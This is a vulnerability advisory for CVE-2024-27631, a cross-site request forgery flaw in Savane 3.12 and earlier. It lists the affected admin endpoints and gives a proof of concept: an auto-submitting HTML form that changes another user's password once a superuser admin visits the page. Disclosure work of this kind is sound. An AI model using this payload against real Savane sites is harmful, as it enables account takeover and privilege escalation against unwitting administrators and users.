# CVE-2024-27631 Vulnerability Details

## Overview

In Savane v3.12 and prior, a lack of CSRF protection on administrative functions can allow for privilege escalation and/or account takeover. In particular, the endpoint `/siteadmin/usergroup.php` includes the functionality to change the passwords and administrative flags of other users, effectively allowing an attacker to make themselves administrator. 

Other notable endpoints vulnerable to CSRF include:

- /support/admin/userperms.php - Changes the permissions of who can post on a tracker.
- /project/admin/conf-copy.php - Overwrites the existing configuration of a group with a copy of another one.
- /project/admin/editgroupnotifications.php - Edits group notifications. Private items can be sent to public mailing lists.
- /project/admin/useradmin.php - Deletes users from a group.
- /news/admin/index.php - Edits the news tracker email address.
- /people/editjob.php - Adds a job for a group.


**CWE Classification:** CWE-352: Cross-Site Request Forgery (CSRF)

**Reported By:** Ally Petitt 

**Affected Product**: Savane

**Affected Versions**: 3.12 and prior

## Validation Steps
This is a Proof-of-Concept (PoC) for changing the password of another user's account as a pathway to account takeover.

1. Select a victim user whose password will be changed.
2. Note their userID from their profile page (`/users/<username>`).
3. Create the following malicious webpage, replacing user_id with the victim's user ID and `<savane_instance>` with the proper domain name/host address.
```
<form id="autosubmit" action="http://<savane_instance>/siteadmin/user_changepw.php" method="POST">

    <input name="form_pw" type="hidden" value="Password1!" />
    <input name="form_pw2" type="hidden" value="Password1!" />
    <input name="user_id" type="hidden" value="<user_id>" />
    <input name="update" type="hidden" value="Update" />
    <input type="submit" value="Submit Request" />
</form>

<script>
document.getElementById("autosubmit").submit();
</script>

```

4. Host the malicious HTML page on a webserver and send the link to an admin (they must be in superuser mode for this to work).
5. After they click the link, log in to the victim account with the very secure password `Password1!`.

_Note that this PoC script was tested on Firefox v103.0 (64-bit)._

## Mitigation

Upgrade to Savane version 3.13 or higher. The patch can be found [here](https://git.savannah.nongnu.org/cgit/administration/savane.git/commit/?h=i18n&id=d3962d3feb75467489b869204db98e2dffaaaf09).



